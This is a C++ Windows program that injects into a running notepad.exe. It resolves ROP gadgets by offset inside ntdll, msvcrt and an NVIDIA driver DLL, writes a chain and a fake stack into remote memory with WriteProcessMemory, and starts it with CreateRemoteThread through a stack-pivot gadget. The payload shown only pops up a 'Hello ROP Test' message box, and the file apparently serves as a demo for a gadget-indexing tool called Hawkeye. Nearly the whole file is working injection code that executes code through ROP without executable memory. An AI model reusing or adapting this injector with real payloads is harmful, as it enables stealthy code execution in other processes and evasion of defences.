#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <cstring>

// Returns the process ID of the first running image whose executable name matches szProcName.
DWORD GetProcessIdByName(const wchar_t* szProcName)
{
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32{};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32))
        {
            do
            {
                if (_wcsicmp(pe32.szExeFile, szProcName) == 0)
                {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return pid;
}

// Returns the load base of szModuleName in the target process, or 0 if the module is not loaded.
uint64_t GetRemoteModuleBase(HANDLE hProcess, DWORD pid, const wchar_t* szModuleName)
{
    uint64_t baseAddr = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        MODULEENTRY32 me32{};
        me32.dwSize = sizeof(MODULEENTRY32);
        if (Module32First(hSnap, &me32))
        {
            do
            {
                if (_wcsicmp(me32.szModule, szModuleName) == 0)
                {
                    baseAddr = (uint64_t)me32.modBaseAddr;
                    break;
                }
            } while (Module32Next(hSnap, &me32));
        }
        CloseHandle(hSnap);
    }
    return baseAddr;
}

/*
 * Notepad + MessageBoxA — remote ROP layout (1 MiB RW block)
 * =============================================================================
 * One VirtualAllocEx(hProcess, NULL, 0x100000, ...) carves three logical regions.
 * Addresses below are offsets from blockBase (the allocation base VA).
 *
 *                              high VA
 *                    +---------------------------+  blockBase + 0x100000
 *                    |                           |
 *     Region A       |  ROP chain (4 KiB)        |  A_base = blockBase + 0xFF000
 *     (chain)        |  * CreateRemoteThread     |  Stage 1 from A_base; stage 2 from [X]
 *                    |    lpParameter -> A_base  |  [X] = A_base + 0x58 (11 QWORDs)
 *                    + - - - - - - - - - - - - - +  blockBase + 0xFF000
 *                    |                           |
 *     Region B       |  Data (4 KiB)              |  B_base = blockBase + 0xFE000
 *     (strings)      |  Text    @ B_base + 0xE00 |
 *                    |  Caption @ B_base + 0xF00 |
 *                    + - - - - - - - - - - - - - +  blockBase + 0xFE000
 *                    |  Trampoline frame         |  C_target_rsp = B_base - 0x40
 *                    |  (4 QWORDs, see step 6)   |  (sits in Region C, just below B)
 *                    |                           |
 *     Region C       |  Scratch / CALL stacks    |  C_base = blockBase
 *     (trampoline)   |  (~0xFE000 - 0x40 bytes)  |  pop rsp; ret pivots RSP here for APIs
 *                    |                           |
 *                    +---------------------------+  blockBase  (low VA)
 *
 * Control flow (simplified)
 * -------------------------
 *   CreateRemoteThread(entry_gadget, A_base)
 *        entry: push rcx; pop rsp; ret   ->  RSP = A_base, walk the QWORD chain in Region A
 *   Stage 1 @ A_base: set MessageBoxA args (rcx/rdx/r8/r9), pop rsp -> C_target_rsp, ret
 *   At C_target_rsp: synthetic stack calls MessageBoxA; on return, RSP -> [X] in Region A
 *   Stage 2 @ [X]: RtlExitUserThread(0) and stop the remote thread cleanly
 *
 * Gadget VAs in step 3 are module_base + RVA (index with Hawkeye ROP against the same build).
 */

int main()
{
    const wchar_t* TARGET_PROC = L"notepad.exe";
    const char* TEXT_STR = "Hello ROP Test";
    const char* CAPTION_STR = "Hawkeye Test";

    // --- 1. Resolve the Notepad process ID ---
    DWORD pid = GetProcessIdByName(TARGET_PROC);
    if (pid == 0)
    {
        std::wcout << L"[!] Target process not found: " << TARGET_PROC << std::endl;
        return -1;
    }
    std::cout << "[+] Target PID: " << pid << std::endl;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == nullptr)
    {
        std::cout << "[!] OpenProcess failed, Err:" << GetLastError() << std::endl;
        return -1;
    }

    // --- 2. Resolve base addresses for the three modules used by this chain ---
    uint64_t base_nvwgf2umx = GetRemoteModuleBase(hProcess, pid, L"nvwgf2umx.dll");
    uint64_t base_ntdll = GetRemoteModuleBase(hProcess, pid, L"ntdll.dll");
    uint64_t base_msvcrt = GetRemoteModuleBase(hProcess, pid, L"msvcrt.dll");
    if (!base_nvwgf2umx || !base_ntdll || !base_msvcrt)
    {
        std::cout << "[!] Failed to resolve module bases; ensure Notepad loaded nvwgf2umx.dll, ntdll.dll, and msvcrt.dll."
                  << std::endl;
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] nvwgf2umx.dll base: 0x" << std::hex << base_nvwgf2umx << std::endl;
    std::cout << "[+] ntdll.dll base:     0x" << std::hex << base_ntdll << std::endl;
    std::cout << "[+] msvcrt.dll base:    0x" << std::hex << base_msvcrt << std::endl;

    // --- 3. Gadget VAs: module base + RVA (from Hawkeye ROP index / chain spec) ---
    uint64_t gadget_entry = base_nvwgf2umx + 0x3c297e;        // push rcx; pop rsp; ret (chain entry pivot)
    uint64_t gadget_pop_rcx_ret = base_ntdll + 0x12429e;      // pop rcx; ret
    uint64_t gadget_pop_rdx_ret = base_msvcrt + 0x78531;      // pop rdx; ret
    uint64_t gadget_pop_r8_ret = base_ntdll + 0x62de9;        // pop r8; ret
    uint64_t gadget_pop_r9_ret = base_nvwgf2umx + 0x1201eb3;  // pop r9; ret
    uint64_t gadget_pop_rsp_ret = base_ntdll + 0x151c3;       // pop rsp; ret
    uint64_t gadget_ret = base_ntdll + 0x151c4;               // ret
    uint64_t gadget_pop_rax_ret = base_ntdll + 0x615da;       // pop rax; ret

    // Resolve MessageBoxA in our address space (same VA in the target on this demo build).
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32)
    {
        std::cout << "[!] LoadLibraryA user32.dll failed, Err:" << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return -1;
    }
    uint64_t pMsgBox = (uint64_t)GetProcAddress(hUser32, "MessageBoxA");
    if (!pMsgBox)
    {
        std::cout << "[!] GetProcAddress MessageBoxA failed" << std::endl;
        FreeLibrary(hUser32);
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] MessageBoxA VA: 0x" << std::hex << pMsgBox << std::endl;

    uint64_t pRtlExitUserThread = (uint64_t)GetProcAddress((HMODULE)base_ntdll, "RtlExitUserThread");
    std::cout << "[+] RtlExitUserThread VA: 0x" << std::hex << pRtlExitUserThread << std::endl;

    // --- 4. Allocate 1 MiB (0x100000) — layout diagram at top of file ---
    LPVOID pRopAllBlock = VirtualAllocEx(hProcess, nullptr, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRopAllBlock)
    {
        std::cout << "[!] VirtualAllocEx (1 MiB ROP block) failed. Err:" << GetLastError() << std::endl;
        FreeLibrary(hUser32);
        CloseHandle(hProcess);
        return -1;
    }
    uint64_t blockBase = (uint64_t)pRopAllBlock;
    uint64_t A_base = blockBase + 0xFF000; // Region A (+0xFF000): top 4 KiB — primary ROP chain
    uint64_t B_base = blockBase + 0xFE000; // Region B (+0xFE000): next 4 KiB — string payloads
    uint64_t C_base = blockBase;           // Region C (+0x00000): remainder — trampoline / scratch
    std::cout << "[+] Remote block base (1 MiB): 0x" << std::hex << blockBase << std::endl;
    std::cout << "[+] Region A (ROP chain):     0x" << std::hex << A_base << std::endl;
    std::cout << "[+] Region B (strings):       0x" << std::hex << B_base << std::endl;
    std::cout << "[+] Region C (trampoline):    0x" << std::hex << C_base << std::endl;

    // --- 5. Region B: string payloads (MessageBoxA lpszText / lpszCaption) ---
    uint64_t strTextAddr = B_base + 0xE00;    // diagram: upper part of Region B
    uint64_t strCaptionAddr = B_base + 0xF00; // +0x100 from Text — avoids overlapping buffers
    WriteProcessMemory(hProcess, (LPVOID)strTextAddr, TEXT_STR, strlen(TEXT_STR) + 1, nullptr);
    WriteProcessMemory(hProcess, (LPVOID)strCaptionAddr, CAPTION_STR, strlen(CAPTION_STR) + 1, nullptr);
    std::cout << "[+] Text VA:    0x" << std::hex << strTextAddr << std::endl;
    std::cout << "[+] Caption VA: 0x" << std::hex << strCaptionAddr << std::endl;

    // --- 6. Region C: synthetic stack at C_target_rsp (just below Region B) ---
    // When stage 1 executes pop rsp; ret, RSP lands here — this frame invokes MessageBoxA.
    uint64_t C_target_rsp = B_base - 0x40;
    uint64_t A_continue = A_base + sizeof(uint64_t) * 11; // [X] in diagram: A_base + 0x58
    uint64_t cFrame[] = {
        pMsgBox,                // [rsp+0x00] return / call target -> MessageBoxA
        gadget_pop_rsp_ret,     // [rsp+0x08] after API: pop rsp; ret
        A_continue,             // [rsp+0x10] new RSP -> Region A stage 2
        gadget_pop_rax_ret      // [rsp+0x18] padding gadget (chain-specific)
    };
    WriteProcessMemory(hProcess, (LPVOID)C_target_rsp, cFrame, sizeof(cFrame), nullptr);
    std::cout << "[+] Region C RSP pivot VA:  0x" << std::hex << C_target_rsp << std::endl;
    std::cout << "[+] Region A stage-2 [X]:   0x" << std::hex << A_continue << std::endl;

    // --- 7. Region A: QWORD chain (each row = 8 bytes at A_base + index*8) ---
    uint64_t ropChain[] = {
        // idx  offset   stage-1: Microsoft x64 MessageBoxA(hWnd, lpText, lpCaption, uType)
        gadget_pop_rcx_ret,  // [0] A+0x00  pop rcx; ret
        0ULL,                // [1] A+0x08  hWnd = NULL
        gadget_pop_rdx_ret,  // [2] A+0x10  pop rdx; ret
        strTextAddr,         // [3] A+0x18  lpText  -> Region B
        gadget_pop_r8_ret,   // [4] A+0x20  pop r8; ret
        strCaptionAddr,      // [5] A+0x28  lpCaption -> Region B
        gadget_pop_r9_ret,   // [6] A+0x30  pop r9; ret
        0ULL,                // [7] A+0x38  uType = MB_OK
        gadget_pop_rsp_ret,  // [8] A+0x40  pop rsp; ret  — pivot to C_target_rsp
        C_target_rsp,        // [9] A+0x48  new RSP (Region C frame)
        gadget_ret,          // [10] A+0x50 ret -> enter synthetic stack / MessageBoxA

        // idx  offset   stage-2 @ [X] = A+0x58 (runs after MessageBox returns)
        gadget_pop_rcx_ret,  // [11] A+0x58  pop rcx; ret
        0ULL,                // [12] A+0x60  exit code for RtlExitUserThread
        gadget_ret,          // [13] A+0x68  ret
        pRtlExitUserThread   // [14] A+0x70  API VA — terminate remote thread
    };
    size_t ropChainSize = sizeof(ropChain);
    WriteProcessMemory(hProcess, (LPVOID)A_base, ropChain, ropChainSize, nullptr);
    std::cout << "[+] ROP chain written to region A (" << std::dec << ropChainSize << " bytes)" << std::endl;

    // --- 8. Kickoff: thread starts at entry gadget; RCX = A_base becomes RSP via push/pop pivot ---
    HANDLE hRemoteThread = CreateRemoteThread(
        hProcess,
        nullptr,
        0,
        (LPTHREAD_START_ROUTINE)gadget_entry, // push rcx; pop rsp; ret (see step 3)
        (LPVOID)A_base,                       // lpParameter -> Region A chain head
        0,
        nullptr
    );
    if (!hRemoteThread)
    {
        std::cout << "[!] CreateRemoteThread failed. Err:" << GetLastError() << std::endl;
        FreeLibrary(hUser32);
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] Remote thread created, handle: " << hRemoteThread << std::endl;
    std::cout << "[*] ROP running; waiting for MessageBox..." << std::endl;
    WaitForSingleObject(hRemoteThread, INFINITE);
    std::cout << "[+] Remote thread finished." << std::endl;

    // Release handles.
    CloseHandle(hRemoteThread);
    FreeLibrary(hUser32);
    CloseHandle(hProcess);
    return 0;
}
